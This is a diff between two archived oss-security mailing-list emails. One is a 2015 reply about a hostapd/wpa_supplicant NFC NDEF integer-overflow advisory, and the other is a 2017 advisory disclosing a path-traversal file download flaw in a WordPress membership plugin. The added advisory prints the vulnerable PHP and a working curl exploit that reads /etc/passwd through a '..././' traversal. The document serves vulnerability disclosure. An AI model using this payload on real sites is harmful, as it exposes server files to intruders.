@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4202" "Sunday" "16" "August" "2015" "15:19:53" "+0200" "Moritz Muehlenhoff" "jmm@debian.org" "<20150816131953.GA32445@pisco.westfalen.local>" "99" "Re: [oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P NFC NDEF record payload length validation" nil nil nil "8" "2015081613:19:53" "[oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P NFC NDEF record payload length validation" (number mark "        jmm@debian.o Aug 16   99/4202  " thread-indent "\"Re: [oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P NFC NDEF record payload length validation\"\n") "<20150708144853.GE10457@w1.fi>" ("<20150708144853.GE10457@w1.fi>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2342" "Tuesday" "14" "March" "2017" "16:33:34" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>" "54" "[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" "^Date:" nil nil "3" "2017031420:33:34" "[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" (number mark "U       larry0@me.co Mar 14   54/2342  " thread-indent "\"[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 9287 invoked by uid 550); 16 Aug 2015 13:20:06 -0000
+Received: (qmail 9373 invoked by uid 550); 14 Mar 2017 20:33:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,121 +11,85 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9266 invoked from network); 16 Aug 2015 13:20:05 -0000
-Message-ID: <20150816131953.GA32445@pisco.westfalen.local>
-References: <20150708144853.GE10457@w1.fi>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20150708144853.GE10457@w1.fi>
-User-Agent: Mutt/1.5.23 (2014-03-12)
-X-SA-Exim-Connect-IP: 141.70.75.12
-X-SA-Exim-Mail-From: jmm@inutil.org
-X-SA-Exim-Scanned: No (on inutil.org); SAEximRunCond expanded to false
-Cc: cve-assign@mitre.org
-Date: Sun, 16 Aug 2015 15:19:53 +0200
-From: Moritz Muehlenhoff <jmm@debian.org>
+Received: (qmail 9355 invoked from network); 14 Mar 2017 20:33:48 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1489523616; bh=9KhqytiDrJxSf+c05pUkL8KaCvB7GotOKTXOHoIkR2A=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=ROLbHDpCm8r59202896bBbKDbtOBNKYmgQRbp6O8+XwjpeDZ+VZ/VAuYRS6kJjD/H
+ rCED0To+cIXv6jNxOFFmIXbmfHpc/8ThvlSc/LBO57nSZWklRy/rgPcgmc9nzRCmW1
+ bWBkDV0Ype9+e1gS15prBVx+u0Rl/YXpRWEEn42Tehh+jErBnyESX0atXThuxF7at8
+ TOJuh1vu03F7Or2MYu1oyYhjjYXJyBPe+5ZwWUW7j8fs5+Bjf1VC67pqFOq3N8gqV4
+ BHiDZJwQVYuIuogf9yS05RhyElbk5t/5IPq+oCho3BQ5dc7IWrAEoAQbSy91CdKKrh
+ 3/Ll6Hxhi4JfA==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2017-03-14_11:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1701120000 definitions=main-1703140157
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Date: Tue, 14 Mar 2017 16:33:34 -0400
+From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] hostapd/wpa_supplicant - Incomplete WPS and P2P
- NFC NDEF record payload length validation
-To: oss-security@lists.openwall.com
+Subject: [oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership
+ Simplified v1.58
+To: Open Source Security <oss-security@lists.openwall.com>
 
-Hi,
-This doesn't seem to have received a CVE assignment, explicitly
-adding cve-assign to CC.
+Title: Arbitrary file download vulnerability in Wordpress Plugin Membership=
+ Simplified v1.58
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-03-13
+CVE-ID:[CVE-2017-1002008]
+Download Site: https://wordpress.org/plugins/membership-simplified-for-oap-=
+members-only
+Vendor: https://profiles.wordpress.org/williamdeangelis/
+Vendor Notified: 2017-03-13
+Vendor Contact: plugins@wordpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D187
+Description: Membership Simplified allows you to generate membership lesson=
+s with templated content to create a unified look and feel throughout your =
+courses.
+Vulnerability:
+The file download code located membership-simplified-for-oap-members-only/d=
+ownload.php does check whether a user is logged in and has download privled=
+ges, the code on line 5 that checks the path can be defeated by using a ...=
+/./ pattern to get the desired ../ after being passed through the str_repla=
+ce() function:
 
-Cheers,
-        Moritz
+ 3 $path =3D substr(getcwd(), 0, -50). "uploads/membership-simplified-for-o=
+ap-members-only/"; // change the path to fit your websites document structu=
+re
+  4 $fullPath =3D $path.$_GET['download_file'];
+  5 $fullPath =3D str_replace("../","",$fullPath);
+  6=20
+  7 if ($fd =3D fopen($fullPath, "r")) {
+  8     $fsize =3D filesize($fullPath);
+  9     $path_parts =3D pathinfo($fullPath);
+ 10     $ext =3D strtolower($path_parts["extension"]);
+ 11     switch ($ext) {
+ 12         case "pdf":
+ 13         header("Content-type: application/pdf"); // add here more heade=
+rs for d    iff. extensions
+ 14         header("Content-Disposition: attachment; filename=3D\"".$path_p=
+arts["base    name"]."\""); // use 'attachment' to force a download
+ 15         break;
+ 16         default;
+ 17         header("Content-type: application/octet-stream");
+ 18         header("Content-Disposition: filename=3D\"".$path_parts["basena=
+me"]."\"")    ;
+ 19     }
+ 20     header("Content-length: $fsize");
+ 21     header("Cache-control: private"); //use this to open files directly
+ 22     while(!feof($fd)) {
+ 23         $buffer =3D fread($fd, 2048);
+ 24         echo $buffer;
 
-On Wed, Jul 08, 2015 at 05:48:53PM +0300, Jouni Malinen wrote:
-> Incomplete WPS and P2P NFC NDEF record payload length validation
-> 
-> Published: July 8, 2015
-> The latest version available from: http://w1.fi/security/2015-5/
-> 
-> 
-> Vulnerability
-> 
-> A vulnerability was found in NDEF record parsing implementation in
-> hostapd and wpa_supplicant. This code is used when an NFC Tag or NFC
-> connection handover is used to trigger WPS or P2P operations. The parser
-> did include bounds checking for the NDEF record payload length, but due
-> to insufficient integer size, it was possible to trigger integer
-> overflow that would result in bypassing the validation step with some
-> malformed NDEF records.
-> 
-> This could result in denial of service due to hostapd/wpa_supplicant
-> process termination (buffer read overflow) or infinite loop. The issue
-> can be triggered only if the NFC stack on the device does not perform
-> required validation steps for received NFC messages before sending the
-> received message to hostapd/wpa_supplicant for processing.
-> 
-> It was possible for the 32-bit record->total_length value to end up
-> wrapping around due to integer overflow if the longer form of payload
-> length field is used and record->payload_length gets a value close to
-> 2^32. This could result in ndef_parse_record() accepting a too large
-> payload length value and the record type filter reading up to about 20
-> bytes beyond the end of the buffer and potentially killing the process.
-> This could also result in an attempt to allocate close to 2^32 bytes of
-> heap memory and if that were to succeed, a buffer read overflow of the
-> same length which would most likely result in the process termination.
-> In case of record->total_length ending up getting the value 0, there
-> would be no buffer read overflow, but record parsing would result in an
-> infinite loop in ndef_parse_records().
-> 
-> Any of these error cases could potentially be used for denial of service
-> attacks over NFC by using a malformed NDEF record on an NFC Tag or
-> sending them during NFC connection handover if the application providing
-> the NDEF message to hostapd/wpa_supplicant did no validation of the
-> received NDEF records. While such validation is likely done in the NFC
-> stack that needs to parse the NFC messages before further processing,
-> hostapd/wpa_supplicant should have (re)confirmed NDEF message validity
-> properly.
-> 
-> 
-> Vulnerable versions/configurations
-> 
-> hostapd v0.7.0-v2.4 with CONFIG_WPS_NFC=y in the build configuration
-> (hostapd/.config) and NFC NDEF records passed to hostapd by the NFC
-> stack without validation.
-> 
-> wpa_supplicant v0.7.0-v2.4 with CONFIG_WPS_NFC=y in the build
-> configuration (wpa_supplicant/.config) and NFC NDEF records passed to
-> wpa_supplicant by the NFC stack without validation.
-> 
-> Note: No NFC stack implementation has yet been identified with
-> capability to pass the malformed NDEF record to
-> hostapd/wpa_supplicant. As such, it is not known whether this issue can
-> be triggered in practice.
-> 
-> Alternatively to an actual NFC operation trigger, the malformed NDEF
-> records could be provided by other applications running on the same
-> device if access to the hostapd/wpa_supplicant control interface is
-> available to untrusted components or users.
-> 
-> 
-> Acknowledgments
-> 
-> Coverity Scan discovered parts of this issue (insecure data
-> handling/TAINTED_SCALAR) and was the trigger for further manual review
-> of the parsing routine.
-> 
-> 
-> Possible mitigation steps
-> 
-> - Merge the following commit and rebuild hostapd/wpa_supplicant:
-> 
->   NFC: Fix payload length validation in NDEF record parser
-> 
->   This patch is available from http://w1.fi/security/2015-5/
-> 
-> - Update to hostapd/wpa_supplicant v2.5 or newer, once available
-> 
-> - Remove CONFIG_WPS_NFC=y from build configuration
-> 
-> - Confirm that the NFC stack does sufficient validation of the received
->   NDEF records before passing them to hostapd/wpa_supplicant
-> 
-> -- 
-> Jouni Malinen                                            PGP id EFC895FA
-> 
+Exploit Code:
+	=E2=80=A2 $ curl http://example.com/wordpress/wp-content/plugins/membershi=
+p-simplified-for-oap-members-only/download.php?download_file=3D..././..././=
+..././..././..././..././..././..././etc/passwd
+	=E2=80=A2=20=20=
